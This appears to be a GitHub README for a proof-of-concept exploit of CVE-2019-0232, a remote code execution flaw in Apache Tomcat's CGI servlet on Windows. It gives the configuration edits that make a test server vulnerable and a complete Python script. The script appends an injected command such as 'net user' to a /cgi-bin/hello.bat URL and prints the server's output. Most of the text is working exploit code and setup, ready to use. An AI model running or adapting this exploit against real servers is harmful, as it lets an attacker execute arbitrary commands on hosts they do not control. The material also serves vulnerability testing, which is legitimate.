# CVE-2019-0232
Apache Tomcat Remote Code Execution on Windows - CGI-BIN

`Windows上的Apache Tomcat远程执行代码 cgi-bin`
![](./CVE-2019-0232.png)

# 使用：

```

Usage: python CVE-2019-0232.py url cmd

```


![](./whoami.jpg)
![](./net-user.jpg)

# 测试环境：
```
jdk8
apache-tomcat-8.5.39

https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/apache-tomcat-8.5.39.zip
```


## 漏洞搭建：修改conf目录配置文件 启功CGI,启动tomcat server服务

#### 参考 https://github.com/pyn3rd/CVE-2019-0232

#### apache-tomcat-8.5.39\conf\web.xml

```
<servlet>
        <servlet-name>cgi</servlet-name>
        <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
        <init-param>
          <param-name>debug</param-name>
          <param-value>0</param-value>
        </init-param>
        <init-param>
          <param-name>cgiPathPrefix</param-name>
          <param-value>WEB-INF/cgi-bin</param-value>
        </init-param>
        <init-param>
          <param-name>executable</param-name>
          <param-value></param-value>
        </init-param>
         <load-on-startup>5</load-on-startup>
</servlet> 
```
#### apache-tomcat-8.5.39\conf\context.xml

```
<Context privileged="true">

    <!-- Default set of monitored resources. If one of these changes, the    -->
    <!-- web application will be reloaded.                                   -->
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>

    <!-- Uncomment this to disable session persistence across Tomcat restarts -->
    <!--
    <Manager pathname="" />
    -->
</Context>

```



## 编写python脚本：

```
import requests
import sys

# http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cnet.exe+user

url = sys.argv[1]

url_dir = "/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C"

cmd = sys.argv[2]

vuln_url = url + url_dir +cmd


print '''
   _______      ________    ___   ___  __  ___          ___ ___  ____ ___  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \        / _ \__ \|___ \__ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______| | | | ) | __) | ) |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______| | | |/ / |__ < / / 
 | |____   \  /  | |____    / /_| |_| || |  / /       | |_| / /_ ___) / /_ 
  \_____|   \/   |______|  |____|\___/ |_| /_/         \___/____|____/____|
  
             Apache Tomcat Remote Code Execution on Windows - CGI-BIN
                                  By Jas502n


'''

print "Usage: python CVE-2019-0232.py url cmd"

print "The Vuln url:\n\n" ,vuln_url

r = requests.get(vuln_url)


print "\nThe Vuln Response Content: \n\n" , r.content

```

## 参考链接：

https://github.com/pyn3rd/CVE-2019-0232
